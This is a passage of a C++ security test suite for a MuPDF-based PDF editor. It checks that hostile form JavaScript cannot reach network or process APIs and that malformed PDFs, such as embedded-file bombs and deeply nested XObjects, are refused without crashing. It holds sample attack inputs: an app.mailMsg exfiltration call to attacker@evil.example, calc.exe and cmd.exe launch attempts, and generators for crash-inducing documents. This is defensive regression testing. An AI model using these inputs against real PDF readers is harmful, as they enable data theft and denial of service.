        "catch(e) { event.rc = false; }",
        "xhr");

    // Positive network-neutralization oracle (R-01): the networking escape
    // surface a hostile script would use for SSRF/exfiltration must be
    // unreachable from form JavaScript.
    const std::string probe = runSandboxProbeString();
    ASSERT_FALSE(probe.empty()) << "sandbox probe produced no result";
    for (const char* api : {"Net", "SOAP", "Collab", "this.submitForm",
                            "this.getURL", "app.openDoc"}) {
        EXPECT_EQ(probeApiType(probe, api), "undefined")
            << "R-01: network/exfil API '" << api
            << "' is exposed to form JavaScript (probe: " << probe << ")";
    }
}

TEST_F(JsApiSurfaceTest, SetTimeoutEvaluated)
{
    runHostileJs(
        "try { setTimeout(function(){app.alert('delayed')}, 100); } "
        "catch(e) {}",
        "settimeout");
}

TEST_F(JsApiSurfaceTest, ImportDataObjectEvaluated)
{
    runHostileJs(
        "try { this.importDataObject('data', 'C:/Windows/System32/cmd.exe'); } "
        "catch(e) {}",
        "import");
}

TEST_F(JsApiSurfaceTest, AppMailMsgEvaluated)
{
    runHostileJs(
        "try { app.mailMsg(false, 'attacker@evil.example', '', '', 'exfil', "
        "'data'); } catch(e) {}",
        "mailmsg");
}

TEST_F(JsApiSurfaceTest, ProcessSpawnAttemptBlocked)
{
    // Most ambitious test: try to spawn a process via every known API.
    // runHostileJs itself now wraps the fire in a ProcessSpawnGuard and
    // asserts no attack process appeared — so this test's *name* is backed
    // by a real observation (no calc.exe/cmd.exe spawned), not just no-throw.
    runHostileJs(
        "try { app.launchURL('file:///C:/Windows/System32/calc.exe'); } "
        "catch(e) {} "
        "try { Launch.action('calc.exe'); } catch(e) {} "
        "try { app.openDoc('C:/Windows/System32/calc.exe'); } catch(e) {}",
        "process_spawn");

    // Belt-and-braces: the launch/open escape APIs must be inert. app.openDoc
    // (arbitrary file open / path traversal) must not even be defined; the
    // MuPDF-provided app.launchURL is a function but must not be wired to a
    // real host launch (that is guarded by JsSandboxRealOracle).
    const std::string probe = runSandboxProbeString();
    ASSERT_FALSE(probe.empty());
    EXPECT_EQ(probeApiType(probe, "app.openDoc"), "undefined")
        << "R-01: app.openDoc (arbitrary file open) is exposed to form JS";
    EXPECT_EQ(probeApiType(probe, "System"), "undefined")
        << "R-01: Acrobat System object (OS/process access) is exposed to form JS";
}

// =====================================================================
// 9. Transparency groups and shading patterns
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, TransparencyGroupHandled)
{
    // PDF with transparency group (alpha blending)
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Group << /S /Transparency /CS /DeviceRGB /I true /K true >> "
        "/Resources << /ExtGState << /GS1 << /Type /ExtGState /ca 0.5 "
        "/CA 0.5 /BM /Multiply >> >> >> /Contents 4 0 R >>\nendobj\n"
        "4 0 obj\n<< /Length 60 >>\nstream\n"
        "q /GS1 gs 1 0 0 rg 100 100 200 200 re f Q\nendstream\nendobj\n"
        "xref\n0 5\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000350 00000 n \n"
        "trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "transparency_group.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Transparency group must not crash";
}

TEST_F(MaliciousPdfAdvancedTest, RadialShadingPatternHandled)
{
    // PDF with shading pattern (radial gradient)
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources << /Shading << /Sh1 4 0 R >> >> /Contents 5 0 R "
        ">>\nendobj\n"
        "4 0 obj\n<< /ShadingType 3 /ColorSpace /DeviceRGB "
        "/Coords [300 400 50 300 400 200] "
        "/Function << /FunctionType 2 /Domain [0 1] /C0 [1 0 0] "
        "/C1 [0 0 1] /N 1 >> >>\nendobj\n"
        "5 0 obj\n<< /Length 20 >>\nstream\n"
        "/Sh1 sh\nendstream\nendobj\n"
        "xref\n0 6\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000280 00000 n \n"
        "0000000450 00000 n \n"
        "trailer\n<< /Size 6 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "radial_shading.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Radial shading pattern must not crash";
}

// =====================================================================
// 10. Embedded file count bomb
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, ManyEmbeddedFilesBounded)
{
    // Build a PDF declaring 1000 entries in /Names /EmbeddedFiles /Names.
    // Each entry points to a tiny embedded file stream. Tests that
    // attachment enumeration scales linearly and doesn't degenerate.
    constexpr int N = 1000;

    std::string names_array = "[";
    for (int i = 0; i < N; ++i) {
        char buf[64];
        std::snprintf(buf, sizeof(buf), "(file%04d) %d 0 R\n", i, 5 + i);
        names_array += buf;
    }
    names_array += "]";

    std::string objects;
    for (int i = 0; i < N; ++i) {
        char buf[256];
        std::snprintf(buf, sizeof(buf),
            "%d 0 obj\n<< /Type /Filespec /F (file%04d.txt) "
            "/EF << /F %d 0 R >> >>\nendobj\n",
            5 + i, i, 5 + N + i);
        objects += buf;

        std::snprintf(buf, sizeof(buf),
            "%d 0 obj\n<< /Type /EmbeddedFile /Length 5 >>\nstream\n"
            "data!\nendstream\nendobj\n",
            5 + N + i);
        objects += buf;
    }

    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Names 3 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /EmbeddedFiles << /Names " + names_array +
        " >> >>\nendobj\n"
        "4 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        ">>\nendobj\n" + objects +
        "trailer\n<< /Size " + std::to_string(5 + 2 * N) +
        " /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "embedded_files_bomb.pdf";
    writePdf(path, pdf);

    auto start = std::chrono::steady_clock::now();
    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            pdfe::attachments::AttachmentManager mgr(ctx_);
            auto attachments = mgr.list(doc.get());
            (void)attachments;
        }
    });
    auto elapsed = std::chrono::steady_clock::now() - start;
    double sec = std::chrono::duration<double>(elapsed).count();
    EXPECT_LT(sec, 30.0)
        << "Enumerating " << N << " embedded files must complete in "
        << "bounded time (took " << sec << "s)";
}

// =====================================================================
// 11. Upstream MuPDF integration edge cases
// =====================================================================

TEST_F(MaliciousPdfAdvancedTest, Type3FontProcedureHandled)
{
    // PDF with Type3 font (PostScript-like procedures for glyphs).
    // Tests MuPDF's Type3 font handling — these have historically been
    // exploit vectors (CVE-2017-12944, etc.).
    std::string pdf =
        "%PDF-1.7\n"
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
        "/Resources << /Font << /F1 4 0 R >> >> /Contents 6 0 R >>\nendobj\n"
        "4 0 obj\n<< /Type /Font /Subtype /Type3 /Name /F1 "
        "/FontBBox [0 0 100 100] /FontMatrix [0.001 0 0 0.001 0 0] "
        "/CharProcs << /A 5 0 R >> "
        "/Encoding << /Type /Encoding /Differences [65 /A] >> "
        "/FirstChar 65 /LastChar 65 /Widths [500] >>\nendobj\n"
        "5 0 obj\n<< /Length 30 >>\nstream\n"
        "500 0 0 0 1000 1000 d1\n0 0 100 100 re f\n"
        "endstream\nendobj\n"
        "6 0 obj\n<< /Length 30 >>\nstream\n"
        "BT /F1 12 Tf 100 700 Td (A) Tj ET\nendstream\nendobj\n"
        "xref\n0 7\n0000000000 65535 f \n"
        "0000000009 00000 n \n0000000058 00000 n \n"
        "0000000115 00000 n \n0000000280 00000 n \n"
        "0000000500 00000 n \n0000000600 00000 n \n"
        "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";

    auto path = td_ / "type3_font.pdf";
    writePdf(path, pdf);

    EXPECT_NO_THROW({
        auto doc = Document::open(ctx_, path);
        if (doc) {
            auto dl = doc->createDisplayList(0);
            if (dl) doc->releaseDisplayList(dl);
        }
    }) << "Type3 font with custom procedures must not crash";
}

// ---------------------------------------------------------------------------
// SEC-38 / GitHub #52 — nested-XObject depth sweep: 8 / 64 / 512 / 4096.
//
// The row asks for "a monotonic boundary, not a no-crash", and that distinction
// is the whole point. The neighbouring tests in this file assert
// EXPECT_NO_THROW around open+render, which a document satisfies by being
// *rejected* just as well as by being handled — and equally well by a renderer
// that silently gave up. None of them can tell "bounded correctly" from
// "did nothing".
//
// A depth sweep can, because the four depths are the same document shape at
// four sizes. Two properties are asserted, and neither requires knowing in
// advance where MuPDF's recursion limit sits (which would make the test a
// restatement of MuPDF's current constant):
//
//   1. THE CONTROL. Depth 8 must parse and render. Without this the sweep is
//      vacuous — a renderer that refuses everything would "pass" a
//      rejection-only test.
//   2. MONOTONICITY. Once a depth is refused, every greater depth must also be
//      refused. A limit that rejects 512 but accepts 4096 is not a limit; it is
//      an accident, and it is the shape that indicates the guard is keyed on
//      something other than depth (a byte count, a timeout) — which is exactly
//      the bug worth catching.
//
// Deliberately NOT asserted: a specific rejection depth. Pinning one would
// redden on any legitimate MuPDF bump.
// ---------------------------------------------------------------------------
namespace {

// A document whose page draws Form XObject 10, which draws 11, ... `depth`
// levels deep. The innermost form paints a rectangle so a successful render has
// something to produce.
std::string nestedXObjectPdf(int depth)
{
    std::string out = "%PDF-1.7\n";
    out += "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n";
    out += "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n";
    out += "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
           "/Resources << /XObject << /X0 10 0 R >> >> /Contents 4 0 R >>\nendobj\n";

    const std::string pageStream = "q /X0 Do Q\n";
    out += "4 0 obj\n<< /Length " + std::to_string(pageStream.size()) +
           " >>\nstream\n" + pageStream + "endstream\nendobj\n";

    for (int i = 0; i < depth; ++i) {
        const int objNum = 10 + i;
        const bool innermost = (i == depth - 1);
        const std::string body = innermost
            ? std::string("0 0 100 100 re f\n")
            : std::string("q /X") + std::to_string(i + 1) + " Do Q\n";
        std::string dict = "<< /Type /XObject /Subtype /Form "
                           "/BBox [0 0 612 792] /Length " +
                           std::to_string(body.size());
        if (!innermost) {
            dict += " /Resources << /XObject << /X" + std::to_string(i + 1) +
                    " " + std::to_string(objNum + 1) + " 0 R >> >>";
        }
        dict += " >>";
        out += std::to_string(objNum) + " 0 obj\n" + dict + "\nstream\n" +
               body + "endstream\nendobj\n";
    }

    // No xref table: MuPDF reconstructs. That is deliberate — computing exact
    // offsets for 4096 objects would make this generator the thing under test.
    out += "trailer\n<< /Size " + std::to_string(10 + depth) +
           " /Root 1 0 R >>\nstartxref\n0\n%%EOF\n";
    return out;
}

}  // namespace

#ifdef _WIN32
namespace {

std::filesystem::path nestedSweepSelfExe()
{
    wchar_t buf[MAX_PATH];
    const DWORD n = ::GetModuleFileNameW(nullptr, buf, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return {};
    return std::filesystem::path(std::wstring(buf, n));
}

}  // namespace
#endif

// The CHILD role. Renders the one document named by PDFE_NESTED_XOBJECT_FILE.
//
// WHY A CHILD AT ALL: rendering a deep enough nested-XObject document
// TERMINATES THE PROCESS (GitHub #159). MuPDF prints "exception stack
// overflow!" and dies; fz_try is setjmp-based and cannot trap a stack overflow,
// as src/app/pdfe_preflight.cpp's own header already notes. Run in-process, the
// first version of this sweep killed the entire gtest binary at exit 127 and
// took every remaining test with it. The parent observes the exit code instead.
TEST(NestedXObjectRenderChild, RunRole)
{
    const char* file = std::getenv("PDFE_NESTED_XOBJECT_FILE");
    if (file == nullptr || *file == '\0') {
        GTEST_SKIP() << "not the render child (PDFE_NESTED_XOBJECT_FILE unset)";
    }
    auto ctx = std::make_shared<pdfe::core::MuPdfContext>();
    auto doc = pdfe::core::Document::open(ctx, std::filesystem::path(file));
    ASSERT_NE(doc, nullptr) << "child could not open " << file;
    ASSERT_GE(doc->pageCount(), 1);
    auto dl = doc->createDisplayList(0);
    if (dl) doc->releaseDisplayList(dl);
    // Reaching here means the render returned. Assert the process is still
    // USABLE rather than merely not-yet-dead: a child that silently did nothing
    // is otherwise indistinguishable from one that survived.
    EXPECT_GE(doc->pageCount(), 1) << "document unusable after render";
}

TEST_F(MaliciousPdfAdvancedTest, NestedXObjectDepthSweepIsMonotonic)
{
#ifndef _WIN32
    GTEST_SKIP() << "child-process sweep is implemented for Windows only";
#else
    const auto exe = nestedSweepSelfExe();
    ASSERT_FALSE(exe.empty()) << "could not resolve this executable";

    struct Result { int depth; DWORD exitCode; bool rendered; };
    const int kDepths[] = {8, 64, 512, 4096};
    std::vector<Result> results;

    for (int depth : kDepths) {
        auto path = td_ / ("nested_xobject_" + std::to_string(depth) + ".pdf");
        writePdf(path, nestedXObjectPdf(depth));

        std::wstring cmd = L"\"" + exe.wstring() +
                           L"\" --gtest_filter=NestedXObjectRenderChild.RunRole "
                           L"--gtest_brief=1";
        std::vector<wchar_t> cmdBuf(cmd.begin(), cmd.end());
        cmdBuf.push_back(L'\0');

        ::SetEnvironmentVariableA("PDFE_NESTED_XOBJECT_FILE",
                                  path.string().c_str());
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        const BOOL created = ::CreateProcessW(
            exe.wstring().c_str(), cmdBuf.data(), nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        // Cleared immediately so a later test in THIS process is never mistaken
        // for the child.
        ::SetEnvironmentVariableA("PDFE_NESTED_XOBJECT_FILE", nullptr);
        ASSERT_TRUE(created) << "CreateProcess failed, err=" << ::GetLastError();

        DWORD code = 0xFFFFFFFF;
        if (::WaitForSingleObject(pi.hProcess, 180000) == WAIT_OBJECT_0) {
            ::GetExitCodeProcess(pi.hProcess, &code);
        } else {
            ::TerminateProcess(pi.hProcess, 1);
        }
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);

        results.push_back({depth, code, code == 0});
        RecordProperty("depth_" + std::to_string(depth) + "_exit",
                       static_cast<int>(code));
    }

    ASSERT_EQ(results.size(), 4u);

    // (1) THE CONTROL. Without a shallow depth that genuinely renders, a build
    //     that refused everything would satisfy the rest of this test.
    EXPECT_TRUE(results[0].rendered)
        << "depth 8 did not render (child exit " << results[0].exitCode
        << "). Either the generator produces an invalid document or nesting is "
           "refused outright -- in both cases this sweep measures nothing.";

    // (2) MONOTONICITY -- the property SEC-38 actually asked for. A bound that
    //     rejects a shallower document and accepts a deeper one is not a depth
    //     bound; it is keyed on something else (a byte count, a timeout), which
    //     means recursion depth is not what is stopping the deep case.
    bool refusedYet = false;
    for (const auto& r : results) {
        if (!r.rendered) { refusedYet = true; continue; }
        EXPECT_FALSE(refusedYet)
            << "depth " << r.depth << " rendered successfully AFTER a shallower "
               "depth was refused -- acceptance is not monotonic in depth";
    }

    // (3) NO DEPTH CRASHES. This used to read "DELIBERATELY NOT ASSERTED: that
    //     no depth crashes. It does today -- GitHub #159, an untrappable stack
    //     overflow in the render path", because asserting correct behaviour
    //     would have committed a failing test. #159 is fixed (phase-16, PDF-85:
    //     src/core/FormXObjectDepthGuard.cpp refuses an over-deep nest BEFORE
    //     the page load that recurses), so the assertion is now made.
    //
    //     A refusal is exit 1 -- an ordinary gtest failure in the child. A
    //     CRASH is a Windows exception status: 0xC0000005, 0xC00000FD
    //     (STATUS_STACK_OVERFLOW, the #159 signature) and friends all have the
    //     top two bits set. Distinguishing them is the whole point: "did not
    //     render" and "killed the process" are the same observation to a
    //     rendered/refused check, and only one of them is a security defect.
    for (const auto& r : results) {
        EXPECT_LT(r.exitCode, 0xC0000000u)
            << "depth " << r.depth << " terminated the child with status 0x"
            << std::hex << r.exitCode << std::dec
            << " -- that is a process-killing crash, not a refusal (GitHub "
               "#159 regressed)";
    }
#endif
}

// ---------------------------------------------------------------------------
// PDF-85 / GitHub #32 — NestedFormXObjectDepthBounded. THE FIX for #159.
//
// PRODUCT GAP, and a specific one. The sweep above deliberately does NOT
// assert that no depth crashes, because at the time it was written every depth
// past ~1024 killed the process: MuPDF's catchable guard is reached only if
// the NATIVE stack survives long enough, and fz_try is setjmp-based, so a
// native stack overflow is untrappable. src/core/FormXObjectDepthGuard.cpp now
// measures the nesting ITERATIVELY before rendering and refuses an over-deep
// document with an ordinary exception.
//
// THE TRAP THIS TEST HAS TO AVOID. MuPDF already copes with 64 and with 512.
// A "bound" set anywhere in that region would pass a naive test, satisfy a
// monotonicity check, and change nothing about the case that kills the
// process. So this test asserts against the depth that DID kill it (4096) and
// requires the child to come back ALIVE and USABLE — a result file the child
// wrote after the refusal is proof the process survived, which is precisely
// what could not be produced before the fix.
//
// THE CONTROL. Depth 8 must still render. A guard that refuses everything
// satisfies every rejection assertion below, and is the obvious wrong fix.
//
// ATTRIBUTION. Depth 300 sits above PDFE's bound (256) and far below anything
// MuPDF struggles with, so a refusal there can only come from this guard. The
// refusal message is asserted, not merely the fact of one, so a refusal
// produced by some unrelated error is not mistaken for the guard working.
// ---------------------------------------------------------------------------

#ifdef _WIN32
// THE CHILD ROLE for the bound. Distinct from NestedXObjectRenderChild above:
// that one lets the exception escape (the sweep reads only the exit code),
// while this one CATCHES it and reports which of the three outcomes happened,
// so "refused cleanly" is distinguishable from "rendered" and from "died".
TEST(NestedFormXObjectBoundChild, RunRole)
{
    const char* file = std::getenv("PDFE_XOBJ_BOUND_FILE");
    const char* result = std::getenv("PDFE_XOBJ_BOUND_RESULT");
    if (file == nullptr || *file == '\0' || result == nullptr || *result == '\0') {
        GTEST_SKIP() << "not the depth-bound child (PDFE_XOBJ_BOUND_FILE unset)";
    }

    // WHICH ENTRY POINT to exercise. Added after the first version of the
    // #159 fix shipped guarding two of thirteen page-load sites: this child
    // only ever called createDisplayList(), so it could not see that
    // pageInfo() -- the one reached by merely OPENING a document -- was still
    // fatal. A single-entry-point probe can only find single-entry-point
    // regressions.
    const char* opEnv = std::getenv("PDFE_XOBJ_BOUND_OP");
    const std::string op = (opEnv && *opEnv) ? opEnv : "displaylist";

    std::string outcome = "unknown";
    std::string what;
    int usable = 0;

    // STAGED PROGRESS. The result file is rewritten after each step, so if the
    // child dies the last line written says WHERE. Without this a crash is
    // indistinguishable from "the guard did not fire", and the two need
    // completely different fixes -- which is exactly the confusion the first
    // run of this test produced.
    auto mark = [&](const char* stage) {
        std::ofstream o(result, std::ios::trunc);
        o << "stage=" << stage << "\n"
          << "outcome=" << outcome << "\n"
          << "usable=" << usable << "\n"
          << "what=" << what << "\n";
    };
    mark("start");
    {
        auto ctx = std::make_shared<pdfe::core::MuPdfContext>();
        mark("context");
        auto doc = pdfe::core::Document::open(ctx, std::filesystem::path(file));
        mark("opened");
        ASSERT_NE(doc, nullptr) << "child could not open " << file;
        ASSERT_GE(doc->pageCount(), 1);
        mark("counted");
        try {
            // THE WORK IS INSIDE THE TRY, and that is a finding rather than a
            // detail. This probe originally loaded the page outside it, and
            // the depth-300 refusal then escaped as an uncaught exception:
            // the child reported "unknown" and exited 1, which reads exactly
            // like a crash. The refusal legitimately comes from the page
            // LOAD, because that is where MuPDF's recursion is.
            //
            // The staged markers still separate "died in MuPDF's page load"
            // (stage stops at "counted") from "died later" (stage reaches
            // "page_loaded").
            if (op == "pageinfo") {
                // THE SITE THE FIRST FIX MISSED. pageInfo() is what
                // PagePanel calls for every page to build thumbnails, so it
                // runs on open with no further user interaction.
                const auto info = doc->pageInfo(0);
                (void)info;
                mark("page_loaded");
            } else if (op == "page") {
                { auto pg = doc->page(0); (void)pg; }
                mark("page_loaded");
            } else {
                { auto pg = doc->page(0); (void)pg; }
                mark("page_loaded");
                void* dl = doc->createDisplayList(0);
                if (dl) doc->releaseDisplayList(dl);
            }
            outcome = "rendered";
        } catch (const std::exception& ex) {
            outcome = "refused";
            what = ex.what();
            for (char& c : what) if (c == '\n' || c == '\r') c = ' ';
        }
        mark("rendered_or_refused");
        // Still a working document afterwards. A process that merely has not
        // died yet is not the same as one that recovered.
        usable = (doc->pageCount() >= 1) ? 1 : 0;
    }
    mark("done");
}
#endif

TEST_F(MaliciousPdfAdvancedTest, NestedFormXObjectDepthBounded)
{
#ifndef _WIN32
    GTEST_SKIP() << "child-process bound check is implemented for Windows only";
#else
    // The bound must sit BELOW the region where the native stack gives out,
    // otherwise the guard never runs on the case it exists for and this whole
    // test would be measuring MuPDF's behaviour instead of PDFE's. Pinned here
    // so raising it back into that region reddens.
    const int limit = pdfe::core::maxFormXObjectDepth();
    ASSERT_GT(limit, 8) << "the bound is below the control depth, so the "
                           "control below cannot render and this test would "
                           "assert nothing";
    ASSERT_LT(limit, 1024)
        << "the Form XObject depth bound is " << limit << ", at or above where "
           "the native stack is exhausted -- a bound there refuses only "
           "documents MuPDF already handles and leaves the process-killing "
           "case exactly as it was (GitHub #159)";

    const auto exe = nestedSweepSelfExe();
    ASSERT_FALSE(exe.empty()) << "could not resolve this executable";

    struct Case { int depth; std::string outcome; std::string usable;
                  std::string what; std::string stage; DWORD exitCode;
                  bool produced; };

    auto runAtOp = [&](int depth, const char* op) -> Case {
        const std::string tag =
            std::to_string(depth) + "_" + std::string(op);
        auto path = td_ / ("xobj_bound_" + tag + ".pdf");
        writePdf(path, nestedXObjectPdf(depth));
        auto resultPath = td_ / ("xobj_bound_" + tag + ".txt");
        std::error_code ec;
        std::filesystem::remove(resultPath, ec);

        std::wstring cmd = L"\"" + exe.wstring() +
                           L"\" --gtest_filter=NestedFormXObjectBoundChild.RunRole "
                           L"--gtest_brief=1";
        std::vector<wchar_t> cmdBuf(cmd.begin(), cmd.end());
        cmdBuf.push_back(L'\0');

        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_FILE", path.string().c_str());
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_RESULT",
                                  resultPath.string().c_str());
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_OP", op);
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        const BOOL created = ::CreateProcessW(
            exe.wstring().c_str(), cmdBuf.data(), nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_FILE", nullptr);
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_RESULT", nullptr);
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_OP", nullptr);

        Case c{depth, "", "", "", "", 0xFFFFFFFF, false};
        if (!created) return c;

        if (::WaitForSingleObject(pi.hProcess, 180000) == WAIT_OBJECT_0) {
            ::GetExitCodeProcess(pi.hProcess, &c.exitCode);
        } else {
            ::TerminateProcess(pi.hProcess, 1);
        }
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);

        std::ifstream in(resultPath);
        std::string line;
        while (std::getline(in, line)) {
            if (!line.empty() && line.back() == '\r') line.pop_back();
            const auto eq = line.find('=');
            if (eq == std::string::npos) continue;
            const std::string k = line.substr(0, eq), v = line.substr(eq + 1);
            if (k == "outcome") c.outcome = v;
            else if (k == "usable") c.usable = v;
            else if (k == "what") c.what = v;
            else if (k == "stage") c.stage = v;
        }
        c.produced = (c.outcome == "rendered" || c.outcome == "refused");
        RecordProperty("bound_" + tag, c.outcome);
        RecordProperty("stage_" + tag, c.stage);
        return c;
    };
    auto runAt = [&](int depth) { return runAtOp(depth, "displaylist"); };

    // (1) CONTROL. An ordinary nest must still render. Without this, a guard
    //     that refused every document would satisfy (2) and (3).
    const Case shallow = runAt(8);
    ASSERT_TRUE(shallow.produced)
        << "the depth-8 child produced no result (exit " << shallow.exitCode
        << ")";
    EXPECT_EQ(shallow.outcome, "rendered")
        << "depth 8 did not render (" << shallow.what << ") -- the bound "
           "refuses ordinary documents, so every refusal assertion below is "
           "vacuous";
    EXPECT_EQ(shallow.exitCode, 0u);

    // (2) ATTRIBUTION. Just over PDFE's bound, far under anything MuPDF has
    //     trouble with, so the refusal is this guard's and the message says so.
    const Case justOver = runAt(limit + 44);
    ASSERT_TRUE(justOver.produced)
        << "the depth-" << (limit + 44) << " child produced no result (exit "
        << justOver.exitCode << ")";
    EXPECT_EQ(justOver.outcome, "refused")
        << "a nest of " << (limit + 44) << " levels was rendered even though "
           "the bound is " << limit;
    EXPECT_NE(justOver.what.find("Form XObjects"), std::string::npos)
        << "the refusal did not come from the depth guard; message was: "
        << justOver.what;
    EXPECT_EQ(justOver.exitCode, 0u);

    // (3) THE DEFECT ITSELF. 4096 is the depth measured to TERMINATE the
    //     process. The result file existing at all is the proof it no longer
    //     does -- a dead child writes nothing.
    const Case lethal = runAt(4096);
    ASSERT_TRUE(lethal.produced)
        << "the depth-4096 child produced no result file (exit "
        << lethal.exitCode << ", last stage reached: \"" << lethal.stage
        << "\"). That is the GitHub #159 signature: the "
           "process died inside MuPDF's recursion before it could report "
           "anything, which is exactly what the depth guard exists to prevent.";
    EXPECT_EQ(lethal.outcome, "refused")
        << "a 4096-level nest was rendered rather than refused";
    EXPECT_EQ(lethal.usable, "1")
        << "the child survived the refusal but its document was left unusable";
    EXPECT_EQ(lethal.exitCode, 0u)
        << "the depth-4096 child exited " << lethal.exitCode
        << " rather than cleanly";
#endif
}

// ---------------------------------------------------------------------------
// PDF-85 / GitHub #159 — EVERY Document page entry point, not just the two
// that happened to be guarded first.
//
// THIS IS THE TEST THAT WAS MISSING, and its absence is the reason an
// incomplete fix passed two gates. NestedFormXObjectDepthBounded above
// exercises page() and createDisplayList(). Both were guarded in the first
// submission, so it went green while `Document::pageInfo()` — reached by
// simply OPENING a document, because PagePanel builds a thumbnail for every
// page — still terminated the process with STATUS_STACK_OVERFLOW.
//
// A per-entry-point test finds per-entry-point regressions. This one sweeps
// the entry points instead, so a newly-unguarded door reddens here. The
// lexical companion, tests/test_page_load_guard_sites.cpp, catches the same
// class one level earlier by scanning src/ for the call sites themselves.
// ---------------------------------------------------------------------------
TEST_F(MaliciousPdfAdvancedTest, EveryPageEntryPointSurvivesADeepNest)
{
#ifndef _WIN32
    GTEST_SKIP() << "child-process bound check is implemented for Windows only";
#else
    const auto exe = nestedSweepSelfExe();
    ASSERT_FALSE(exe.empty()) << "could not resolve this executable";

    struct Case { int depth; std::string outcome; std::string usable;
                  std::string what; std::string stage; DWORD exitCode;
                  bool produced; };

    auto runAtOp = [&](int depth, const char* op) -> Case {
        const std::string tag = std::to_string(depth) + "_" + std::string(op);
        auto path = td_ / ("xobj_entry_" + tag + ".pdf");
        writePdf(path, nestedXObjectPdf(depth));
        auto resultPath = td_ / ("xobj_entry_" + tag + ".txt");
        std::error_code ec;
        std::filesystem::remove(resultPath, ec);

        std::wstring cmd = L"\"" + exe.wstring() +
                           L"\" --gtest_filter=NestedFormXObjectBoundChild.RunRole "
                           L"--gtest_brief=1";
        std::vector<wchar_t> cmdBuf(cmd.begin(), cmd.end());
        cmdBuf.push_back(L'\0');

        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_FILE", path.string().c_str());
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_RESULT",
                                  resultPath.string().c_str());
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_OP", op);
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        const BOOL created = ::CreateProcessW(
            exe.wstring().c_str(), cmdBuf.data(), nullptr, nullptr, FALSE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_FILE", nullptr);
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_RESULT", nullptr);
        ::SetEnvironmentVariableA("PDFE_XOBJ_BOUND_OP", nullptr);

        Case c{depth, "", "", "", "", 0xFFFFFFFF, false};
        if (!created) return c;

        if (::WaitForSingleObject(pi.hProcess, 180000) == WAIT_OBJECT_0) {
            ::GetExitCodeProcess(pi.hProcess, &c.exitCode);
        } else {
            ::TerminateProcess(pi.hProcess, 1);
        }
        ::CloseHandle(pi.hThread);
        ::CloseHandle(pi.hProcess);

        std::ifstream in(resultPath);
        std::string line;
        while (std::getline(in, line)) {
            if (!line.empty() && line.back() == '\r') line.pop_back();
            const auto eq = line.find('=');
            if (eq == std::string::npos) continue;
            const std::string k = line.substr(0, eq), v = line.substr(eq + 1);
            if (k == "outcome") c.outcome = v;
            else if (k == "usable") c.usable = v;
            else if (k == "what") c.what = v;
            else if (k == "stage") c.stage = v;
        }
        c.produced = (c.outcome == "rendered" || c.outcome == "refused");
        RecordProperty("entry_" + tag, c.outcome);
        RecordProperty("entrystage_" + tag, c.stage);
        return c;
    };

